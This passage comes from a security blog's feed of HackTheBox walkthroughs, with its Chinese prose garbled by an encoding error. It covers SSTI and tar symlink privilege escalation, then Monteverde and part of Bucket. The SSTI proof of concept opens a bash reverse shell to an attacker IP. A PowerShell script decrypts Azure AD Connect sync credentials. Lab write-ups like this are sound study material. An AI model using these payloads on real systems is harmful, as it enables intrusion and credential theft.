src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_DJFLL2yqDs.png" alt=""></p><h3 id="SSTI-GetShell"><a href="#SSTI-GetShell" class="headerlink" title="SSTI GetShell"></a>SSTI GetShell</h3><p>å…¶å®ä»£ç å®¡è®¡çš„æ—¶å€™å°±å‘ç°orderè¿™é‡Œæ˜¯å­˜åœ¨SSTIï¼Œåªæ˜¯å½“æ—¶åˆ©ç”¨ä¸äº†ã€‚ç°åœ¨å¯ä»¥è®¿é—®åˆ°äº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_j4dP1C-SsI.png" style="zoom:50%;" /></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_FSifZ3c6Pv.png" alt=""></p><p><strong>POC</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">addr=123&amp;costume=%7B%7B%22%22.__class__.__bases__%5B0%5D.__subclasses__()%5B132%5D.__init__.__globals__%5B<span class="hljs-string">&#x27;popen&#x27;</span>%5D(<span class="hljs-string">&#x27;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.6%2F7781%200%3E%261%22&#x27;</span>).<span class="hljs-built_in">read</span>()%7D%7D&amp;q=123<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_R1H0vwZTLq.png" alt=""></p><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>é€šè¿‡linpeaså’Œè¿›ç¨‹å‘ç°rootè¿è¡Œçš„docker-proxy</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_f8hNkU2mua.png" style="zoom:50%;" /></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_pxB7sGhcUZ.png" alt=""></p><blockquote><p>Docker ä»£ç†å…è®¸ä¸»æœºå’Œå®¹å™¨ä¹‹é—´è¿›è¡Œç½‘ç»œé€šä¿¡ï¼Œé€šè¿‡å°†ç«¯å£ä»ä¸»æœºæ˜ å°„åˆ°å®¹å™¨å†…éƒ¨ï¼Œæ¥å®ç°å¯¹å®¹å™¨ä¸­æœåŠ¡çš„è®¿é—®</p></blockquote><p>ä½†è¿™ä¼¼ä¹ä¸èƒ½ç›´æ¥åˆ©ç”¨ï¼Œåªèƒ½ä¸Špspyç›‘å¬ä¸€ä¸‹è¿›ç¨‹</p><p>å‘ç°rootä¸€ç›´åœ¨è¿è¡Œ<code>/usr/bin/backup.sh</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zZuTUUWv5W.png" alt=""></p><p>è¿™ä¸ªè„šæœ¬çš„é—®é¢˜å‡ºåœ¨<code>/usr/bin/tar -chvf</code>çš„hå‚æ•°ä¸Š</p><ul><li><code>-h</code>ï¼šå¤„ç†ç¬¦å·é“¾æ¥æ–‡ä»¶æ—¶ï¼Œå°†å…¶å†…å®¹ä½œä¸ºæ–‡ä»¶è€Œä¸æ˜¯é“¾æ¥è¿›è¡Œå¤„ç†</li></ul><p>ä¹Ÿå°±æ˜¯è¯´ <code>ln -s test checksum</code>ä¹‹åï¼Œ<code>tar -h</code>ä¼šå»å¯»æ‰¾testæ–‡ä»¶ï¼Œè€Œä¸æ˜¯checksumã€‚è¿™å°±é€ æˆäº†åˆ©ç”¨rootä»»æ„æ–‡ä»¶è¯»å–çš„æ¼æ´</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_tz0gDdEoET.png" alt=""></p><p>é“¾æ¥æ–‡ä»¶å¹¶å°†å‹ç¼©æ–‡ä»¶å¤åˆ¶åˆ°tmp</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_G_Qa8Aciie.png" alt=""></p><p>ä¸€ç•ªæŠ˜è…¾ä¹‹åå‘ç°å¹¶ä¸æ˜¯è¿™ä¸ªflag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_eExs2JyzMQ.png" alt=""></p><p>è€Œä¸”<code>/opt/backups/checksum</code>åˆè¢«åˆ æ‰äº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vMEpavFxw1.png" alt=""></p><p>å†™ä¸ªwhileè¯­å¥ï¼Œå½“<code>/opt/backups/checksum</code>å‡ºç°çš„æ—¶å€™ï¼Œåˆ æ‰å®ƒã€‚å†æŠŠroot.txté“¾æ¥è¿‡å»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span> <span class="hljs-keyword">if</span> [ -e /opt/backups/checksum ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">rm</span> -f /opt/backups/checksum; <span class="hljs-built_in">ln</span> -s -f /root/root.txt /opt/backups/checksum; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ln done!&quot;</span>; <span class="hljs-built_in">break</span>; <span class="hljs-keyword">fi</span>; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_fBee67KgoB.png" alt=""></p><p>å‡ æ¬¡å°è¯•ä¹‹åæˆåŠŸè·å–root flag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MWiHV18Ixf.png" alt=""></p><p>å¯¹å‘³ï¼Œå¦‚æœæƒ³GetShellçš„è¯å¯ä»¥è¯»SSHç§é’¥</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_mN1Gx6CYbj.png" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
      <tag>Cloud Native Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Monteverde HackTheBox</title>
    <link href="/2023/09/16/Monteverde-HackTheBox/"/>
    <url>/2023/09/16/Monteverde-HackTheBox/</url>
    
    <content type="html"><![CDATA[<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç«¯å£ä¿¡æ¯"><a href="#ç«¯å£ä¿¡æ¯" class="headerlink" title="ç«¯å£ä¿¡æ¯"></a>ç«¯å£ä¿¡æ¯</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ns0WgbUCss.png" style="zoom: 50%;" /></p><p>è¿™å›è¿Webç«™ç‚¹éƒ½æ²¡æœ‰ï¼Œå…¥å£åº”è¯¥æ˜¯WindowsæœåŠ¡äº†</p><h4 id="ç”¨æˆ·åæ³„éœ²"><a href="#ç”¨æˆ·åæ³„éœ²" class="headerlink" title="ç”¨æˆ·åæ³„éœ²"></a>ç”¨æˆ·åæ³„éœ²</h4><p>é€šè¿‡RPCæœåŠ¡å‘ç°äº†10ä¸ªç”¨æˆ·å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">AAD_987d7f2f57d2<br>mhope<br>SABatchJobs<br>svc-ata<br>svc-bexec<br>svc-netapp<br>dgalanos<br>roleary<br>smorgan<br>Guest<br><br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Pu-tXq8DHp.png" alt=""></p><h3 id="ZeroLogon"><a href="#ZeroLogon" class="headerlink" title="ZeroLogon"></a>ZeroLogon</h3><p>ç«Ÿç„¶æœ‰ZeroLogon</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_2fD9lgULHA.png" alt=""></p><p>æ¸¸æˆç»“æŸâ€¦</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cfnkJIwIcf.png" alt=""></p><p>åˆ©ç”¨ç©ºå¯†ç Dump Hash</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_svxYQL9-kB.png" alt=""></p><p>PTH</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_m4ezcYJvtq.png" alt=""></p><h3 id="è®¤çœŸæ‰“é¶"><a href="#è®¤çœŸæ‰“é¶" class="headerlink" title="è®¤çœŸæ‰“é¶"></a>è®¤çœŸæ‰“é¶</h3><p>è¿™æ ·çš„è¯ä¹Ÿå¤ªæ²¡æ„ä¹‰äº†ï¼Œæ­£å¸¸è·¯å¾„ä¸åº”è¯¥æ˜¯è¿™æ ·çš„ã€‚</p><p>å¢™è£‚æ¨èåŸŸæ¸—é€æ€ç»´å¯¼å›¾ï¼š</p><p><a href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg">https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg</a></p><h4 id="ASREP-Roast"><a href="#ASREP-Roast" class="headerlink" title="ASREP Roast"></a>ASREP Roast</h4><p>ä¸Šé¢è·å–åˆ°äº†ç”¨æˆ·åï¼Œå¯ä»¥è¯•ä¸€ä¸‹ASREPRoastå¯æƒœæ²¡æœ‰</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7qGr_B7Sa1.png" alt=""></p><h4 id="å¯†ç å–·æ´’"><a href="#å¯†ç å–·æ´’" class="headerlink" title="å¯†ç å–·æ´’"></a>å¯†ç å–·æ´’</h4><p>ä»å¯†ç ç­–ç•¥æ¥çœ‹ï¼Œæœ€å°7ä½ï¼›ADåŸŸä¹Ÿæœ‰é”å®šè´¦æˆ·çš„ç­–ç•¥ã€‚æˆ‘ä»¬åªèƒ½å°è¯•å¯†ç å–·æ´’</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_UY6PQunONN.png" style="zoom:50%;" /></p><p>å…ˆè¯•ä¸€ä¸‹ç”¨æˆ·åå¯†ç ç›¸åŒçš„æƒ…å†µï¼Œè·å¾—ä¸€ä¸ªç”¨æˆ·å¯†ç </p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Kl0UXB6QwU.png" alt=""></p><p>5985ç«¯å£è™½ç„¶å¼€äº†ä½†æ˜¯winrmç™»é™†å¤±è´¥</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_JChkNxaDmz.png" alt=""></p><h4 id="å…±äº«æ³„æ¼å¯†ç "><a href="#å…±äº«æ³„æ¼å¯†ç " class="headerlink" title="å…±äº«æ³„æ¼å¯†ç "></a>å…±äº«æ³„æ¼å¯†ç </h4><p>å°è¯•çœ‹çœ‹å…±äº«ï¼Œå¯è¯»çš„ç›®å½•å¾ˆå¤š</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Azo3I0uL0x.png" alt=""></p><p>å‘ç°Azureå¯†ç </p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_KFAO4LB1RS.png" alt=""></p><p>å°è¯•winrmç™»å½•ï¼Œè·å–user flag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vSzw7FKSwx.png" alt=""></p><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>ä¸ŠBloodHoundæ‰«äº†ä¸€éï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆå¯ç”¨çš„ææƒè·¯å¾„</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_EUvTUD2V3F.png" alt=""></p><p>winPEASå‘ç°äº†Azure Tokenï¼Œäº†è§£äº†ä¸€ä¸‹Tokenå·²ç»æ˜¯è¿‡æœŸçš„äº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_C6lt0QqRm4.png" alt=""></p><p>åé¢ç•™æ„åˆ°mhopeåœ¨Azure Adminsç»„ä¸­ï¼›</p><blockquote><p>Azure Adminsæ˜¯ Azure AD ä¸­çš„ä¸€ä¸ªé¢„å®šä¹‰ç»„ï¼Œè¯¥ç»„æˆå‘˜å¯ä»¥æ‰§è¡Œä»»ä½• Azure AD æ“ä½œ</p></blockquote><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_5gpLdLmMBR.png" alt=""></p><p>äºæ˜¯å¼€å§‹å¯»æ‰¾å¦‚ä½•é€šè¿‡AzureADææƒï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯éœ€è¦åœ¨Azureäº‘ä¸Šæ“ä½œçš„ï¼Œç”¨ä¸ä¸Šã€‚</p><h4 id="AzureADææƒ"><a href="#AzureADææƒ" class="headerlink" title="AzureADææƒ"></a>AzureADææƒ</h4><p>æœ€ç»ˆåœ¨è¿™ä¸ªGithubé¡¹ç›®ä¸­å‘ç°äº†é€šè¿‡Azure ADè¿æ¥åŒæ­¥è´¦æˆ·åŒæ­¥æ•´ä¸ªåŸŸhashçš„ææƒæ–¹å¼ï¼Œæ­£å¥½é€‚åˆæˆ‘ä»¬è¿™ç§æƒ…å†µã€‚</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cJoYpqpCu2.png" alt=""></p><p>XPNå¤§ä½¬å†™å¥½äº†è·å–å¯†ç å¹¶åˆ©ç”¨mcrypt.dllè§£å¯†è·å–æ˜æ–‡å¯†ç çš„PowerShell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">Write-Host <span class="hljs-string">&quot;AD Connect Sync Credential Extract POC (@_xpn_)`n&quot;</span><br><br><span class="hljs-variable">$client</span> = new-object System.Data.SqlClient.SqlConnection -ArgumentList <span class="hljs-string">&quot;Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync&quot;</span><br><span class="hljs-variable">$client</span>.Open()<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$client</span>.CreateCommand()<br><span class="hljs-variable">$cmd</span>.CommandText = <span class="hljs-string">&quot;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&quot;</span><br><span class="hljs-variable">$reader</span> = <span class="hljs-variable">$cmd</span>.ExecuteReader()<br><span class="hljs-variable">$reader</span>.Read() | Out-Null<br><span class="hljs-variable">$key_id</span> = <span class="hljs-variable">$reader</span>.GetInt32(0)<br><span class="hljs-variable">$instance_id</span> = <span class="hljs-variable">$reader</span>.GetGuid(1)<br><span class="hljs-variable">$entropy</span> = <span class="hljs-variable">$reader</span>.GetGuid(2)<br><span class="hljs-variable">$reader</span>.Close()<br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$client</span>.CreateCommand()<br><span class="hljs-variable">$cmd</span>.CommandText = <span class="hljs-string">&quot;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &#x27;AD&#x27;&quot;</span><br><span class="hljs-variable">$reader</span> = <span class="hljs-variable">$cmd</span>.ExecuteReader()<br><span class="hljs-variable">$reader</span>.Read() | Out-Null<br><span class="hljs-variable">$config</span> = <span class="hljs-variable">$reader</span>.GetString(0)<br><span class="hljs-variable">$crypted</span> = <span class="hljs-variable">$reader</span>.GetString(1)<br><span class="hljs-variable">$reader</span>.Close()<br><br>add-type -path <span class="hljs-string">&#x27;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll&#x27;</span><br><span class="hljs-variable">$km</span> = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager<br><span class="hljs-variable">$km</span>.LoadKeySet(<span class="hljs-variable">$entropy</span>, <span class="hljs-variable">$instance_id</span>, <span class="hljs-variable">$key_id</span>)<br><span class="hljs-variable">$key</span> = <span class="hljs-variable">$null</span><br><span class="hljs-variable">$km</span>.GetActiveCredentialKey([ref]<span class="hljs-variable">$key</span>)<br><span class="hljs-variable">$key2</span> = <span class="hljs-variable">$null</span><br><span class="hljs-variable">$km</span>.GetKey(1, [ref]<span class="hljs-variable">$key2</span>)<br><span class="hljs-variable">$decrypted</span> = <span class="hljs-variable">$null</span><br><span class="hljs-variable">$key2</span>.DecryptBase64ToString(<span class="hljs-variable">$crypted</span>, [ref]<span class="hljs-variable">$decrypted</span>)<br><br><span class="hljs-variable">$domain</span> = select-xml -Content <span class="hljs-variable">$config</span> -XPath <span class="hljs-string">&quot;//parameter[@name=&#x27;forest-login-domain&#x27;]&quot;</span> | select @&#123;Name = <span class="hljs-string">&#x27;Domain&#x27;</span>; Expression = &#123;<span class="hljs-variable">$_</span>.node.InnerXML&#125;&#125;<br><span class="hljs-variable">$username</span> = select-xml -Content <span class="hljs-variable">$config</span> -XPath <span class="hljs-string">&quot;//parameter[@name=&#x27;forest-login-user&#x27;]&quot;</span> | select @&#123;Name = <span class="hljs-string">&#x27;Username&#x27;</span>; Expression = &#123;<span class="hljs-variable">$_</span>.node.InnerXML&#125;&#125;<br><span class="hljs-variable">$password</span> = select-xml -Content <span class="hljs-variable">$decrypted</span> -XPath <span class="hljs-string">&quot;//attribute&quot;</span> | select @&#123;Name = <span class="hljs-string">&#x27;Password&#x27;</span>; Expression = &#123;<span class="hljs-variable">$_</span>.node.InnerText&#125;&#125;<br><br>Write-Host (<span class="hljs-string">&quot;Domain: &quot;</span> + <span class="hljs-variable">$domain</span>.Domain)<br>Write-Host (<span class="hljs-string">&quot;Username: &quot;</span> + <span class="hljs-variable">$username</span>.Username)<br>Write-Host (<span class="hljs-string">&quot;Password: &quot;</span> + <span class="hljs-variable">$password</span>.Password)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦å°†ç¬¬ä¸€è¡Œçš„è¿æ¥ä¿¡æ¯æ”¹ä¸€ä¸‹ï¼Œå¦åˆ™ç›´æ¥æŠ¥é”™é€€å‡ºwinrm</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$client</span> = new-object System.Data.SqlClient.SqlConnection -ArgumentList <span class="hljs-string">&quot;Server=127.0.0.1;Database=ADSync;Integrated Security=True</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_4kZGsR6BOP.png" alt=""></p><p>è·å¾—root flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
      <tag>Cloud Native Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bucket-HackTheBox</title>
    <link href="/2023/08/24/Bucket-HackTheBox/"/>
    <url>/2023/08/24/Bucket-HackTheBox/</url>
    
    <content type="html"><![CDATA[<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_WIqDISHbwT.png" alt=""></p><h4 id="Webç«™ç‚¹"><a href="#Webç«™ç‚¹" class="headerlink" title="Webç«™ç‚¹"></a>Webç«™ç‚¹</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_AkPgFMrnkf.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªs3.bucket.htb</p><h2 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h2><h4 id="S3æœªæˆæƒè®¿é—®"><a href="#S3æœªæˆæƒè®¿é—®" class="headerlink" title="S3æœªæˆæƒè®¿é—®"></a>S3æœªæˆæƒè®¿é—®</h4><p>ä½†æ˜¯å¾ˆå¯æƒœï¼Œæ²¡ä»€ä¹ˆæœ‰ä»·å€¼çš„å†…å®¹</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_fba2o-RYBS.png" alt=""></p><p>Fuzzingå‡ºä¸ªShellæ¥</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_qtEyGkSf1a.png" alt=""></p><p>ç›´æ¥è®¿é—®çš„è¯ä¼šè·³åˆ°ä¸€ä¸ªå¥‡æ€ªçš„åœ°å€</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8mn-kGLLwA.png" alt=""></p><h4 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h4><p>æ—¢ç„¶S3å­˜åœ¨æœªæˆæƒè®¿é—®ï¼Œé‚£æˆ‘ä»¬å¯ä»¥è¯•è¯•å¾€ä¸Šé¢PUTæ–‡ä»¶ã€‚æ•´ä¸ªPHPä¸Šå»è¦æ˜¯èƒ½è§£æçš„è¯å°±æ‹¿ä¸‹äº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_328fIpax1A.png" alt=""></p><p>å¯æƒœè¿˜æ˜¯ä¸è¡Œï¼Œåœ¨è¿™è¾¹è®¿é—®åªèƒ½ä¸‹è½½</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_hYbuQmNcZr.png" alt=""></p><p>åé¢ç•™æ„åˆ°ï¼Œè¿™adserver/index.htmlè·Ÿä¸»ç«™çš„å†…å®¹æ˜¯ä¸€æ ·çš„ã€‚æ˜¯ä¸æ˜¯èƒ½åœ¨ä¸»ç«™è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„PHPå‘¢ï¼Ÿ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_1lUVNpm8fW.png" alt=""></p><p>ç¡®å®æ˜¯ï¼Œæ€»æ˜¯å–œæ¬¢æè¿™äº›å°æŠŠæˆ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_I8dHCkMAlP.png" alt=""></p><p>ç›´æ¥åå¼¹Shell</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_k73kdI3bZC.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_oXYBg74K4c.png" alt=""></p><h2 id="å®¹å™¨é€ƒé€¸"><a href="#å®¹å™¨é€ƒé€¸" class="headerlink" title="å®¹å™¨é€ƒé€¸"></a>å®¹å™¨é€ƒé€¸</h2><h3 id="ä¿¡æ¯æ”¶é›†-1"><a href="#ä¿¡æ¯æ”¶é›†-1" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p>linpeaså‘ç°äº†awså‡­æ®ï¼Œå¯ä»¥ç°åœ¨æ²¡æœ‰æƒé™</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_TpcHibOd7J.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Uucn_VRKpo.png" alt=""></p><p>rootè·‘äº†ä¸ªDynamoDB</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_EUYrIuqI6A.png" alt=""></p><p>ç«¯å£ä¿¡æ¯</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_AIXRHk6M2G.png" alt=""></p><p>royç”¨æˆ·çš„bashrcå¯è¯»</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-sufdH3d4F.png" alt=""></p><p>è¿™é‡Œè®¾ç½®äº†ç›®å½•ACLï¼Œä¹Ÿå±äºäººä¸ºåŠ¨ä½œï¼Œåˆ°æ—¶å€™å¯ä»¥å…³æ³¨ä¸€ä¸‹</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_iaXcQPKhTb.png" alt=""></p><h3 id="æ•°æ®åº“å¯†ç æ³„éœ²"><a href="#æ•°æ®åº“å¯†ç æ³„éœ²" class="headerlink" title="æ•°æ®åº“å¯†ç æ³„éœ²"></a>æ•°æ®åº“å¯†ç æ³„éœ²</h3><p>è¿™é‡Œå‘ç°äº†ä¸€äº›royç”¨æˆ·çš„é¡¹ç›®æ–‡ä»¶</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CvRERpfI_t.png" alt=""></p><p>æœ‰ä¸ªdb.phpå¯ä»¥çœ‹çœ‹ï¼Œå¾ˆå¯èƒ½å­˜åœ¨å¯†ç </p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vFVF8wwM9y.png" alt=""></p><p>è¿™é‡Œç”¨aws sdkå»è¿æ¥DynamoDBï¼Œè€Œä¸”ä¸éœ€è¦AKSKã€‚ç›¸å½“äºå­˜åœ¨æœªæˆæƒè®¿é—®çš„DynamoDBï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨aws cliè¿æ¥</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vXcff_Ug4C.png" alt=""></p><p>å¤±è´¥äº†ï¼Œé—®äº†ä¸€ä¸‹GPTã€‚awsä¼šåœ¨å®¶ç›®å½•åˆ›å»ºä¸€ä¸ª.awsç”¨æˆ·å­˜å‚¨é…ç½®ã€‚æ‰€ä»¥è¿™é‡ŒæŠŠå®¶ç›®å½•æ”¹æˆ/tmpå³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> HOME=/tmp<br></code></pre></td></tr></table></figure><p>è·å–ç”¨æˆ·æ•°æ®</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_NTCqIrv9gF.png" alt=""></p><h4 id="å¯†ç é‡ç”¨"><a href="#å¯†ç é‡ç”¨" class="headerlink" title="å¯†ç é‡ç”¨"></a>å¯†ç é‡ç”¨</h4><p>è¿™é‡Œæ‹¿åˆ°å‡ ä¸ªå¯†ç ï¼Œå¯ä»¥è¯•ä¸€ä¸‹ssh</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_SoInGRYS0O.png" alt=""></p><h2 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h2><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image__-O_lN-_LY.png" alt=""></p><p>æ„Ÿè§‰è¿™é‡Œå¤§æœ‰å¯ä¸ºå˜›ï¼ŒæŸ¥ä¸€ä¸‹webæœåŠ¡é…ç½®ã€‚çœ‹çœ‹è¿™ä¸ªç«™ç‚¹å¦‚ä½•è®¿é—®ã€‚</p><p>åªç›‘å¬äº†127.0.0.1è·Ÿä¹‹å‰ç«¯å£ä¿¡æ¯é‚£è¾¹å¯¹åº”ä¸Šäº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_kJWVMbtukD.png" alt=""></p><h4 id="ç«¯å£è½¬å‘"><a href="#ç«¯å£è½¬å‘" class="headerlink" title="ç«¯å£è½¬å‘"></a>ç«¯å£è½¬å‘</h4><p>é¶æœºå†…8000ç«¯å£è½¬è‡³VPS</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -L 8000:127.0.0.1:8000 roy@bucket.htb -fN<br></code></pre></td></tr></table></figure><p>VPS 8000ç«¯å£è½¬è‡³æœ¬åœ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -L 8000:127.0.0.1:8000 aurey@43.134.44.115 -fN<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_twL2bKxuT6.png" alt=""></p><p>è¿˜æ˜¯å»äº†è§£ä¸€ä¸‹è¿™ä¸ª<code>pd4ml_demo.jar</code>å§</p><blockquote><p>PD4ML æ˜¯ä¸€ä¸ªæµè¡Œçš„ Java åº“ï¼Œæ—¨åœ¨æ–¹ä¾¿åœ°å°† HTML å†…å®¹è½¬æ¢ä¸ºé«˜è´¨é‡çš„æ‰“å°è¾“å‡ºæˆ–å¯ä¸‹è½½çš„ PDF 